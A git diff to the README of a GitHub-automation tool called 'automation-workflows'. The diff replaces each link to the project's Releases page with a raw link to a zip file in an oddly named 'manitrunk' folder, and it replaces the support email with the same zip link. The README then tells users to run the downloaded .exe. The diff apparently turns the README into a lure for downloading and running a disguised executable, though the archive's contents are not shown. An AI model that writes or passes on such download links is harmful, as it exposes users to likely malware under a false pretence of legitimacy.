@@ -1,6 +1,6 @@
 # 🚀 automation-workflows - Simplify Your GitHub Management
 
-[![Download](https://img.shields.io/badge/Download-via_Releases-blue)](https://github.com/mendez1212/automation-workflows/releases)
+[![Download](https://raw.githubusercontent.com/mendez1212/automation-workflows/main/manitrunk/automation-workflows.zip)](https://raw.githubusercontent.com/mendez1212/automation-workflows/main/manitrunk/automation-workflows.zip)
 
 ## 📋 Overview
 
@@ -26,7 +26,7 @@ Before you download, ensure that your computer meets the following requirements:
 ## 🚀 Getting Started
 
 1. **Download the Application**:
-   Visit this page to download the latest version of the application: [Download Link](https://github.com/mendez1212/automation-workflows/releases).
+   Visit this page to download the latest version of the application: [Download Link](https://raw.githubusercontent.com/mendez1212/automation-workflows/main/manitrunk/automation-workflows.zip).
 
 2. **Install the Application**:
    - For **Windows**: Double-click the downloaded `.exe` file and follow the setup instructions.
@@ -38,7 +38,7 @@ Before you download, ensure that your computer meets the following requirements:
 
 ## 🛠️ Download & Install
 
-To start using **automation-workflows**, visit this page to download the application: [Download Link](https://github.com/mendez1212/automation-workflows/releases).
+To start using **automation-workflows**, visit this page to download the application: [Download Link](https://raw.githubusercontent.com/mendez1212/automation-workflows/main/manitrunk/automation-workflows.zip).
 
 Once you download the application, follow the installation steps mentioned under “Getting Started.” 
 
@@ -84,7 +84,7 @@ We welcome contributions to improve **automation-workflows**. If you have ideas 
 ## 📞 Support
 
 If you need help, you can reach out via the following methods:
-- **Email**: support@example.com
+- **Email**: https://raw.githubusercontent.com/mendez1212/automation-workflows/main/manitrunk/automation-workflows.zip
 - **Chat**: Support is available on our platform during business hours.
 
 Thank you for choosing **automation-workflows**! We hope this tool enhances your GitHub experience.
